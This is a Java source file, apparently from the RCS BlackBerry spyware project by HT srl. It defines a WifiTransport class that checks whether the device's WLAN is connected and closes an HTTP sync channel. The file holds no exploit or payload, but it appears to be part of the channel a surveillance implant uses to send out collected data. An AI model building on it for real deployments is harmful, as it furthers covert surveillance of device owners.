//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2011
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/

package blackberry.action.sync.transport;

import net.rim.device.api.system.RadioInfo;
import net.rim.device.api.system.WLANInfo;
import blackberry.Messages;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

public class WifiTransport extends HttpTransport {

    //#ifdef DEBUG
    private static Debug debug = new Debug(
            "WifiTransport", DebugLevel.INFORMATION); //$NON-NLS-1$
    //#endif

    boolean wifiForced;

    private boolean forced;

    public WifiTransport(String host, boolean wifiForced) {
        super(host);

        this.wifiForced = wifiForced;
    }

    public boolean isAvailable() {
        //#ifdef DEBUG
        debug.trace("isAvailable"); //$NON-NLS-1$
        //#endif
        final boolean wifi = WLANInfo.getAPInfo() != null;
        final boolean active = (RadioInfo.getActiveWAFs() & RadioInfo.WAF_WLAN) != 0;
        boolean available = (WLANInfo.getWLANState() & WLANInfo.WLAN_STATE_CONNECTED) != 0;

        //#ifdef DEBUG
        debug.trace("isAvailable wifi: " + wifi + " & " + active + " & " //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
                + available);
        //#endif
        return wifi && active && available;
    }

    protected String getSuffix() {
        return Messages.getString("n.5"); //$NON-NLS-1$
    }

    //#ifdef DEBUG
    public String toString() {
        return "WifiTransport " + host; //$NON-NLS-1$
    }

    //#endif

    public void close() {
        super.close();
        if (wifiForced && forced) {
            disableWifi();
            forced = false;
        }
    }

    public static void disableWifi() {
        //TODO
    }

}
